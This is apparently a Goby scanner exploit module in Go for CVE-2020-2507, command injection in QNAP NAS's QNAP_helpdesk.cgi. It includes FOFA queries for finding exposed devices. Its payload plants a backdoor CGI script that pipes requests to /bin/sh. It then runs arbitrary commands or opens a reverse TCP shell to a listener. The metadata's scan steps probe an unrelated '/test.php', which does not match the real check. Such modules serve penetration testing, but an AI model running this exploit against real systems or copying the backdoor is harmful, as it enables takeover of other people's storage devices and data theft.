package exploits

import (
  "errors"
  "git.gobies.org/goby/goscanner/godclient"
  "git.gobies.org/goby/goscanner/goutils"
  "git.gobies.org/goby/goscanner/jsonvul"
  "git.gobies.org/goby/goscanner/scanconfig"
  "git.gobies.org/goby/httpclient"
  "net/url"
  "strings"
  "time"
)

func init() {
  expJson := `{
    "Name": "QNAP QNAP_helpdesk.cgi remote command execution vulnerability (CVE-2020-2507)",
    "Description": "<p>QNAP NAS (Network Attached Storage) is a network-attached storage device manufactured by QNAP Technology Co., Ltd. in Taiwan. It is a storage solution designed for home and business users that allows users to access and share storage space over the network.</p><p>QNAP NAS has a command execution vulnerability in QNAP_helpdesk.cgi. An attacker can use this vulnerability to execute arbitrary commands on the server side, write a backdoor, obtain server permissions, and then control the entire web server.</p>",
    "Product": "QNAP-NAS",
    "Homepage": "https://www.qnap.com/",
    "DisclosureDate": "2021-02-04",
    "PostTime": "2023-12-12",
    "Author": "Gryffinbit@gmail.com",
    "FofaQuery": "(((header=\"http server\" && body=\"redirect_suffix\") || body=\"/css/qnap-default.css\" || body=\"/redirect.html?count=\\\"+Math.random()\" || body=\"/indexnas.cgi?counter=\") && body!=\"Server: couchdb\") || (body=\"qnap_hyperlink\" && body=\"QNAP Systems, Inc.</a> All Rights Reserved.\")",
    "GobyQuery": "(((header=\"http server\" && body=\"redirect_suffix\") || body=\"/css/qnap-default.css\" || body=\"/redirect.html?count=\\\"+Math.random()\" || body=\"/indexnas.cgi?counter=\") && body!=\"Server: couchdb\") || (body=\"qnap_hyperlink\" && body=\"QNAP Systems, Inc.</a> All Rights Reserved.\")",
    "Level": "3",
    "Impact": "<p>QNAP NAS has a command execution vulnerability in QNAP_helpdesk.cgi. An attacker can use this vulnerability to execute arbitrary commands on the server side, write a backdoor, obtain server permissions, and then control the entire web server.</p>",
    "Recommendation": "<p>The manufacturer has released a vulnerability fix, please update and upgrade in time: <a href=\"https://www.qnap.com/zh-tw/security-advisory/qsa-20-08\">https://www.qnap.com/zh-tw/security-advisory/qsa-20-08</a></p>",
    "References": [],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "attackType",
            "type": "select",
            "value": "cmd,reverse",
            "show": ""
        },
        {
            "name": "cmd",
            "type": "input",
            "value": "whoami",
            "show": "attackType=cmd"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "Command Execution"
    ],
    "VulType": [
        "Command Execution"
    ],
    "CVEIDs": [
        "CVE-2020-2507"
    ],
    "CNNVD": [
        "CNNVD-202102-292"
    ],
    "CNVD": [
        "CNVD-2021-14803"
    ],
    "CVSSScore": "9.8",
    "Translation": {
        "CN": {
            "Name": "QNAP QNAP_helpdesk.cgi 远程命令执行漏洞（CVE-2020-2507）",
            "Product": "QNAP-NAS",
            "Description": "<p>QNAP NAS（Network Attached Storage）是一种网络附加存储设备，由台湾的威联通科技公司制造。它是一种专为家庭和企业用户设计的存储解决方案，允许用户通过网络访问和共享存储空间。<br></p><p>QNAP NAS 在 QNAP_helpdesk.cgi 处存在命令执行漏洞，攻击者可通过该漏洞在服务器端任意执行命令，写入后门，获取服务器权限，进而控制整个web服务器。</p>",
            "Recommendation": "<p>厂商已发布漏洞修复程序，请及时更新升级：<a href=\"https://www.qnap.com/zh-tw/security-advisory/qsa-20-08\" target=\"_blank\">https://www.qnap.com/zh-tw/security-advisory/qsa-20-08</a><br></p>",
            "Impact": "<p>QNAP NAS 在 QNAP_helpdesk.cgi 处存在命令执行漏洞，攻击者可通过该漏洞在服务器端任意执行命令，写入后门，获取服务器权限，进而控制整个web服务器。<br></p>",
            "VulType": [
                "命令执行"
            ],
            "Tags": [
                "命令执行"
            ]
        },
        "EN": {
            "Name": "QNAP QNAP_helpdesk.cgi remote command execution vulnerability (CVE-2020-2507)",
            "Product": "QNAP-NAS",
            "Description": "<p>QNAP NAS (Network Attached Storage) is a network-attached storage device manufactured by QNAP Technology Co., Ltd. in Taiwan. It is a storage solution designed for home and business users that allows users to access and share storage space over the network.</p><p>QNAP NAS has a command execution vulnerability in QNAP_helpdesk.cgi. An attacker can use this vulnerability to execute arbitrary commands on the server side, write a backdoor, obtain server permissions, and then control the entire web server.</p>",
            "Recommendation": "<p>The manufacturer has released a vulnerability fix, please update and upgrade in time: <a href=\"https://www.qnap.com/zh-tw/security-advisory/qsa-20-08\" target=\"_blank\">https://www.qnap.com/zh-tw/security-advisory/qsa-20-08</a><br></p>",
            "Impact": "<p>QNAP NAS has a command execution vulnerability in QNAP_helpdesk.cgi. An attacker can use this vulnerability to execute arbitrary commands on the server side, write a backdoor, obtain server permissions, and then control the entire web server.<br></p>",
            "VulType": [
                "Command Execution"
            ],
            "Tags": [
                "Command Execution"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10901"
}`

  sendpayload73GdbFR93vsgY := func(hostInfo *httpclient.FixUrl) (*httpclient.HttpResponse, error) {
    paylaodConfig := httpclient.NewPostRequestConfig("/QNAP_helpdesk.cgi?hdanz_performance_test=Start&Dump=True")
    paylaodConfig.VerifyTls = false
    paylaodConfig.FollowRedirect = false
    paylaodConfig.Data = "enc_num=;`echo '#!/bin/sh' > /home/httpd/sysdebugResp.cgi; echo 'echo' >> /home/httpd/sysdebugResp.cgi; echo 'cat | /bin/sh' >> /home/httpd/sysdebugResp.cgi; chmod 755 /home/httpd/sysdebugResp.cgi`"
    return httpclient.DoHttpRequest(hostInfo, paylaodConfig)
  }

  getResultGdbFR93vsgY := func(hostInfo *httpclient.FixUrl, payload string) (*httpclient.HttpResponse, error) {
    checkRequestConfig := httpclient.NewPostRequestConfig(`/sysdebugResp.cgi`)
    checkRequestConfig.VerifyTls = false
    checkRequestConfig.FollowRedirect = false
    checkRequestConfig.Data = "enc_num=;``"
    // 检查 sysdebugResp.cgi 文件是否存在，不存在则创建
    if resp, err := httpclient.DoHttpRequest(hostInfo, checkRequestConfig); resp == nil && err != nil {
      return nil, err
    } else if resp != nil && resp.StatusCode != 200 {
      // 写入shell脚本，为了获得命令回显，sysdebugResp.cgi 文件名固定，避免重复发包
      if trojan, err := sendpayload73GdbFR93vsgY(hostInfo); trojan == nil && err != nil {
        return nil, err
      } else if trojan != nil && trojan.StatusCode != 200 && !strings.Contains(trojan.Utf8Html, "<QPKG>QNAP Diagnostic Tool</QPKG>") && !strings.Contains(trojan.Utf8Html, "<QPKG_version>") && !strings.Contains(trojan.Utf8Html, "<firmware>") {
        return nil, errors.New("漏洞利用失败")
      }
      time.Sleep(2)
      // 文件不存在，重新检查文件是否被创建成功
      if check, err := httpclient.DoHttpRequest(hostInfo, checkRequestConfig); check == nil && err != nil {
        return nil, err
      } else if check != nil && check.StatusCode != 200 {
        return nil, errors.New("创建文件失败")
      }
    }
    // 文件存在，直接发送数据
    resultConfig := httpclient.NewPostRequestConfig("/sysdebugResp.cgi")
    resultConfig.VerifyTls = false
    resultConfig.FollowRedirect = false
    resultConfig.Data = payload
    return httpclient.DoHttpRequest(hostInfo, resultConfig)
  }

  ExpManager.AddExploit(NewExploit(
    goutils.GetFileName(),
    expJson,
    func(poc *jsonvul.JsonVul, hostInfo *httpclient.FixUrl, stepLogs *scanconfig.SingleScanConfig) bool {
      randStr := goutils.RandomHexString(8)
      cmd := "echo " + randStr
      resp, _ := getResultGdbFR93vsgY(hostInfo, "echo `"+cmd+"`;")
      return resp != nil && resp.StatusCode == 200 && strings.Contains(resp.Utf8Html, randStr)
    },
    func(expResult *jsonvul.ExploitResult, stepLogs *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
      attackType := goutils.B2S(stepLogs.Params["attackType"])
      if attackType == "cmd" {
        cmd := goutils.B2S(stepLogs.Params["cmd"])
        result, err := getResultGdbFR93vsgY(expResult.HostInfo, "echo `"+cmd+"`;")
        if err != nil {
          expResult.Output = err.Error()
          return expResult
        } else if result != nil && result.StatusCode == 200 {
          expResult.Success = true
          expResult.Output = result.Utf8Html
          return expResult
        }
      } else if attackType == "reverse" {
        waitSessionCh := make(chan string)
        //rp就是拿到的监听端口
        if rp, err := godclient.WaitSession("reverse_linux", waitSessionCh); err != nil || len(rp) == 0 {
          expResult.Output = "godclient bind failed!"
          expResult.Success = false
          return expResult
        } else {
          reverse := godclient.ReverseTCPBySh(rp)
          getResultGdbFR93vsgY(expResult.HostInfo, reverse)
          select {
          case webConsoleID := <-waitSessionCh:
            u, err := url.Parse(webConsoleID)
            if err != nil {
              expResult.Success = false
              expResult.Output = err.Error()
              return expResult
            }
            expResult.Success = true
            expResult.OutputType = "html"
            sid := strings.Join(u.Query()["id"], "")
            expResult.Output = `<br/><a href="goby://sessions/view?sid=` + sid + `&key=` + godclient.GetKey() + `">open shell</a>`
          case <-time.After(time.Second * 20):
            expResult.Success = false
            expResult.Output = "漏洞利用失败"
          }
        }
      } else {
        expResult.Output = `未知的利用方式`
      }
      return expResult
    },
  ))
}
